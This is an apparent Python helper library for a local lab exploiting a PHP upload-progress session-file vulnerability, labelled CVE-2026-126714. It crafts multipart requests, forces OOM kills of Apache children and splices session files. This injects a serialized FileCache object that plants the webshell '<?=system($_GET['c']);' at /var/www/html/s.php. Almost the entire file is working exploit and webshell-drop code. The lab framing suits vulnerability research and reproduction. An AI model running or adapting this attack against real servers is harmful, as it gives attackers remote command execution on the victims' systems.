#!/usr/bin/env python3
"""
Shared library for the phpAfterShell (CVE-2026-126714) local lab.

Byte-level models of the three request types that drive the bug:

  carrier     multipart POST, held open -> PHP's RFC1867 upload-progress
              callback writes the progress record *before any app code runs*
  bio-store   ordinary application POST -> $_SESSION['bio'] = <payload>
  replacement multipart POST, same progress token -> callback rewrites the
              progress record in place (this is the write we interrupt)

All offsets are predicted analytically from the exact serialization layout
captured in recon, then verified against the real bytes on disk.
"""
from __future__ import annotations

import json
import os
import re
import socket
import subprocess
import time
import uuid

BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SESSIONS = os.path.join(BASE, "sessions")
CONTAINER = "phpaftershell-victim-1"
HOST, PORT = "127.0.0.1", 8087

BOUNDARY = "----LabBoundary7MA4YWxkTrZu0gW"
DELIM = "--" + BOUNDARY  # body delimiter prefix

TOKEN = "tok" + "A" * 15          # fixed-length progress token (18 chars)
PROGRESS_NAME = "PHP_SESSION_UPLOAD_PROGRESS"

# Geometry constants (see README for the full derivation).
# Two profiles:
#   small - local-controller stages (stage1/stage2): oom_score_adj is set
#           from inside the container, so the victim wins the OOM regardless
#           of its RSS; smaller payloads converge faster.
#   big   - remote HTTP-only mode: fillers can never out-RSS the apache
#           master (post_max_size caps a request at 8MiB), so the victim's
#           own RSS must exceed the master's at the OOM moment.
LF = 3000                         # replacement field_name length (window prefix)
LEN2 = 2_000_000                  # replacement filename length -> splice window
L1 = 2_010_000                    # bio payload length in the carrier session
CL_R = 5_000_000                  # replacement Content-Length (7 digits; >= body,
                                  # <= post_max_size 8388608; freq=1% suppresses
                                  # any update after the file-start one)
DATA_CARRIER = b"X" * 8000        # >8KB total body so Apache flushes to PHP
DATA_REPL = b"Y" * 16_384

GEOMETRIES = {
    "small": dict(LEN2=2_000_000, L1=2_010_000, CL_R=5_000_000),
    "big":   dict(LEN2=7_990_000, L1=8_000_000, CL_R=8_300_000),
}


def set_geometry(name: str) -> None:
    global LEN2, L1, CL_R
    g = GEOMETRIES[name]
    LEN2, L1, CL_R = g["LEN2"], g["L1"], g["CL_R"]
# RCE payload record: FileCache gadget (see app/gadget.php). Its __destruct
# drops a webshell at /var/www/html/s.php when the consumer request ends.
# <?=...; is always available (short_open_tag is irrelevant for <?=).
OBJ = (b'evil|O:9:"FileCache":2:{s:4:"path";s:19:"/var/www/html/s.php";'
       b's:7:"content";s:22:"<?=system($_GET[\'c\']);";}')
SHELL_URL_PATH = "/s.php"
# After R's filename string closes in the mixed file, the parser is still
# nested inside a:5:{ a:1:{ a:7:{ . These bytes complete a:7's remaining
# 5 elements and close all three arrays, returning to top level, where the
# evil object record becomes a real session key.
SUFFIX = (b'";s:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;'
          b's:10:"start_time";i:1795170886;s:15:"bytes_processed";i:0;'
          b'}}}')


# ---------------------------------------------------------------- container

def sh(cmd: str, timeout: int = 30) -> str:
    r = subprocess.run(["docker", "exec", CONTAINER, "sh", "-c", cmd],
                       capture_output=True, text=True, timeout=timeout)
    return r.stdout


def restart_victim() -> None:
    subprocess.run(["docker", "restart", CONTAINER], check=True, timeout=60)
    for _ in range(50):
        try:
            out = subprocess.run(["curl", "-s", "--max-time", "2",
                                  f"http://{HOST}:{PORT}/"],
                                 capture_output=True, timeout=5)
            if b'"php"' in out.stdout:
                time.sleep(0.4)
                return
        except Exception:
            pass
        time.sleep(0.2)
    raise RuntimeError("victim did not come back up")


_MEM_PATH: str | None = None


def _mem_path() -> str:
    global _MEM_PATH
    if _MEM_PATH:
        return _MEM_PATH
    cid = sh("cat /etc/hostname").strip()
    cands = [
        f"/sys/fs/cgroup/docker/{cid}/memory.current",
        f"/sys/fs/cgroup/system.slice/docker-{cid}.scope/memory.current",
        f"/sys/fs/cgroup/system.slice/docker-{cid}.slice/memory.current",
    ]
    for p in cands:
        if os.path.exists(p):
            _MEM_PATH = p
            return p
    for root, dirs, _ in os.walk("/sys/fs/cgroup"):
        for d in dirs:
            if cid in d and os.path.exists(os.path.join(root, d,
                                                       "memory.current")):
                _MEM_PATH = os.path.join(root, d, "memory.current")
                return _MEM_PATH
        if root.count("/") > 6:
            dirs.clear()
    raise RuntimeError("cgroup memory.current not found")


def mem_current() -> int:
    """memory.current of the container's cgroup, read from the host."""
    with open(_mem_path()) as f:
        return int(f.read())


def set_mem_limit(bytes_: int) -> None:
    subprocess.run(["docker", "update", "--memory", str(bytes_),
                    "--memory-swap", str(bytes_), CONTAINER],
                   check=True, timeout=30)


def find_child_by_port(src_port: int) -> int | None:
    """PID inside the container of the apache child holding our src port."""
    out = subprocess.run(["docker", "exec", CONTAINER, "sh", "-c",
                          "cat /proc/net/tcp /proc/net/tcp6 2>/dev/null"],
                         capture_output=True, text=True, timeout=15).stdout
    inode = None
    for line in out.splitlines()[1:]:
        f = line.split()
        if len(f) < 10:
            continue
        local = f[1]
        try:
            lp = int(local.split(":")[1], 16)
        except ValueError:
            continue
        if lp == src_port and f[3] == "01":  # ESTABLISHED
            inode = f[9]
            break
    if not inode:
        return None
    out = subprocess.run(["docker", "exec", CONTAINER, "sh", "-c",
                          f"ls -l /proc/*/fd 2>/dev/null | grep -B20 'socket:[{inode}]' "
                          f"| grep -oE '/proc/[0-9]+' | tail -1"],
                         capture_output=True, text=True, timeout=20).stdout
    m = re.search(r"(\d+)", out)
    return int(m.group(1)) if m else None


def set_oom_adj(pid: int, adj: int) -> bool:
    r = subprocess.run(["docker", "exec", CONTAINER, "sh", "-c",
                        f"echo {adj} > /proc/{pid}/oom_score_adj"],
                       capture_output=True, text=True, timeout=15)
    return r.returncode == 0


# ------------------------------------------------------------- session file

def sid_new() -> str:
    return uuid.uuid4().hex


def sess_path(sid: str) -> str:
    return os.path.join(SESSIONS, f"sess_{sid}")


def sess_read(sid: str) -> bytes:
    try:
        with open(sess_path(sid), "rb") as f:
            return f.read()
    except FileNotFoundError:
        return b""
    except PermissionError:
        r = subprocess.run(["docker", "exec", CONTAINER, "cat",
                            f"/tmp/sess_{sid}"],
                           capture_output=True, timeout=30)
        return r.stdout if r.returncode == 0 else b""


def sess_write(sid: str, data: bytes) -> None:
    """Write atomically as www-data (the file's owner; container root lacks
    DAC override on this daemon's exec context)."""
    subprocess.run(
        ["docker", "exec", "-i", "--user", "www-data", CONTAINER, "sh", "-c",
         f"cat > /tmp/.mix.$$.tmp && mv /tmp/.mix.$$.tmp /tmp/sess_{sid}"],
        input=data, check=True, timeout=60)


def sess_chmod(sid: str, mode: str = "666") -> None:
    subprocess.run(["docker", "exec", "--user", "www-data", CONTAINER,
                    "chmod", mode, f"/tmp/sess_{sid}"],
                   check=True, timeout=15)


def sess_sync_evict(sid: str) -> None:
    """Flush dirty pages then drop the session file's page cache."""
    sh("sync")
    try:
        fd = os.open(sess_path(sid), os.O_RDONLY)
        try:
            os.posix_fadvise(fd, 0, 0, os.POSIX_FADV_DONTNEED)
        finally:
            os.close(fd)
    except OSError:
        pass


# ---------------------------------------------------------------- requests

def _http(host_port: int, req: bytes, read_resp: bool,
          timeout: float = 10.0) -> tuple[socket.socket, bytes]:
    s = socket.create_connection((HOST, host_port))
    s.sendall(req)
    if not read_resp:
        return s, b""
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    s.close()
    return s, data


def carrier_hold(sid: str) -> tuple[socket.socket, int]:
    """Held upload-progress request (writes the progress record, never ends)."""
    body = progress_body("file", "c.txt", DATA_CARRIER)
    cl = len(body) + 2000
    req = (f"POST /index.php HTTP/1.1\r\nHost: localhost\r\n"
           f"Cookie: PHPSESSID={sid}\r\n"
           f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
           f"Content-Length: {cl}\r\nConnection: keep-alive\r\n\r\n").encode() + body
    s, _ = _http(PORT, req, read_resp=False)
    # local port of our side, to identify the serving child later
    sport = s.getsockname()[1]
    return s, sport


def replacement_hold(sid: str, field_name: str | None = None,
                     filename: str | None = None,
                     data: bytes | None = None) -> tuple[socket.socket, int]:
    # geometry globals must be read at call time: set_geometry() may run
    # after this module was imported (Python default args bind at def time).
    if field_name is None:
        field_name = "F" * LF
    if filename is None:
        filename = "G" * LEN2
    if data is None:
        data = DATA_REPL
    body = progress_body(field_name, filename, data)
    cl = CL_R
    req = (f"POST /index.php HTTP/1.1\r\nHost: localhost\r\n"
           f"Cookie: PHPSESSID={sid}\r\n"
           f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
           f"Content-Length: {cl}\r\nConnection: keep-alive\r\n\r\n").encode() + body
    s, _ = _http(PORT, req, read_resp=False)
    sport = s.getsockname()[1]
    return s, sport


def store_bio(sid: str, payload: bytes) -> bytes:
    body = b"bio=" + payload
    req = (f"POST /index.php HTTP/1.1\r\nHost: localhost\r\n"
           f"Cookie: PHPSESSID={sid}\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
    _, resp = _http(PORT, req, read_resp=True)
    return resp


def progress_body(field_name: str, filename: str, data: bytes) -> bytes:
    return (
        f"{DELIM}\r\n"
        f'Content-Disposition: form-data; name="{PROGRESS_NAME}"\r\n\r\n'
        f"{TOKEN}\r\n"
        f"{DELIM}\r\n"
        f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n".encode()
        + data + b"\r\n"
    )


def consume(sid: str, port: int = PORT, timeout: float = 15.0) -> dict:
    """GET the consumer endpoint and return the parsed session report."""
    req = (f"GET /index.php HTTP/1.1\r\nHost: localhost\r\n"
           f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n").encode()
    _, resp = _http(port, req, read_resp=True, timeout=timeout)
    txt = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else resp
    # display_errors may prepend warnings; extract the JSON object
    start = txt.find(b"{")
    if start < 0:
        return {"raw": txt[:400].decode(errors="replace")}
    try:
        return json.loads(txt[start:])
    except json.JSONDecodeError:
        return {"raw": txt[:400].decode(errors="replace")}


# ---------------------------------------------------------------- geometry

def progress_len_replacement() -> int:
    """Predicted length of R's progress record (= Pr)."""
    return len(r_prefix()) + LEN2 + len(r_suffix())


def r_prefix(bp: int | None = None) -> bytes:
    """
    Bytes of R's progress record up to and including the opening quote of
    the filename string. f = len(r_prefix()).

    Only the DIGIT COUNT of bp matters for f (the value varies per run but
    the layout keeps it at 7 digits: headers-end ~2.006M, body ~2.02M), so
    a 7-digit placeholder yields the exact predicted length.
    """
    ts = int(time.time())          # 10 digits until year 2286
    if bp is None:
        bp = 2_000_000            # 7-digit placeholder (length only!)
    head = (
        f"upload_progress_{TOKEN}|a:5:{{"
        f's:10:"start_time";i:{ts};'
        f's:14:"content_length";i:{CL_R};'
        f's:15:"bytes_processed";i:{bp};'
        f's:4:"done";b:0;'
        f's:5:"files";a:1:{{i:0;a:7:{{'
        f's:10:"field_name";s:{LF}:"' + "F" * LF +
        f'";s:4:"name";s:{LEN2}:"'
    )
    return head.encode()


def r_suffix() -> bytes:
    """Bytes of R's progress record after the filename content."""
    ts = int(time.time())
    return (
        f'";s:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;'
        f's:10:"start_time";i:{ts};s:15:"bytes_processed";i:0;}}}}'
    ).encode()


def f_offset() -> int:
    """Offset in R where the filename string content starts."""
    return len(r_prefix())


def e_offset() -> int:
    """Offset where R's filename string ends -> must hold `"` in C."""
    return f_offset() + LEN2


def k_target() -> int:
    """Page-aligned offset in the middle of the splice window."""
    return ((f_offset() + e_offset()) // 2) & ~4095


def build_payload(p_start: int, e_off: int) -> bytes:
    """
    bio payload for C. Layout inside C (all inert: it is string content
    in C's own parse):

        payload[e_off - p_start] == '"'   <- closes R's filename string in mix
        then ';' + a:7 elements + 3 array closers  (SUFFIX)
        then the evil object record        (top-level in the mix)
        then a pad record whose content runs to |C|-2, using C's own
        trailing '";' as its closer.
    """
    plant = e_off - p_start
    if plant < 0:
        raise ValueError(f"plant offset negative: {plant}")
    total_c = p_start + L1 + 2          # |C|
    # pad record: pad|s:T:"<content>";  content ends at |C|-2
    t = 0
    for _ in range(6):
        pad = f'pad|s:{t}:"'.encode()
        pad_content_start = p_start + plant + len(SUFFIX) + len(OBJ) + len(pad)
        t_new = total_c - 2 - pad_content_start
        if t_new == t:
            break
        t = t_new
    payload = b"A" * plant + SUFFIX + OBJ + pad
    if len(payload) > L1:
        raise ValueError(f"payload {len(payload)} > L1 {L1}")
    payload += b"B" * (L1 - len(payload))
    return payload


def verify_c(c: bytes, p_start: int, e_off: int, payload: bytes) -> None:
    assert c[p_start:p_start + L1] == payload, "payload mismatch in C"
    assert c[e_off] == ord('"'), f"C[e_off]={c[e_off]!r} expected '\"'"
    rel = e_off - p_start
    assert payload[rel:rel + len(SUFFIX)] == SUFFIX, "suffix not at E'"
    obj_at = e_off + len(SUFFIX)
    assert c[obj_at:obj_at + len(OBJ)] == OBJ, "object not after suffix"
    assert len(c) == p_start + L1 + 2, f"|C|={len(c)} expected {p_start + L1 + 2}"


def verify_r(r: bytes, c: bytes) -> tuple[int, int]:
    """Locate f and E' in the real R bytes; cross-check against C."""
    marker = f's:{LEN2}:"'.encode()
    idx = r.find(marker)
    assert idx >= 0, "filename header not found in R"
    f_actual = idx + len(marker)
    e_actual = f_actual + LEN2
    # predicted
    f_pred = f_offset()
    if f_actual != f_pred:
        raise AssertionError(
            f"f mismatch: actual={f_actual} predicted={f_pred} "
            f"(bp formula wrong? r_prefix needs adjusting)")
    assert e_actual < len(c), f"E'={e_actual} beyond |C|={len(c)}"
    assert c[e_actual] == ord('"'), f"C[E']={c[e_actual]!r} not '\"'"
    return f_actual, e_actual


def splice(c: bytes, r: bytes, k: int) -> bytes:
    assert 0 < k <= len(c), f"k={k} outside (0, |C|={len(c)}]"
    return r[:k] + c[k:]


def pick_k(f_actual: int, e_actual: int) -> int:
    """Page-aligned k inside the splice window [f, E']."""
    mid = (f_actual + e_actual) // 2
    k = mid & ~4095
    if k < ((f_actual + 4095) & ~4095):
        k = (f_actual + 4095) & ~4095
    if k > (e_actual & ~4095):
        k = e_actual & ~4095
    return k
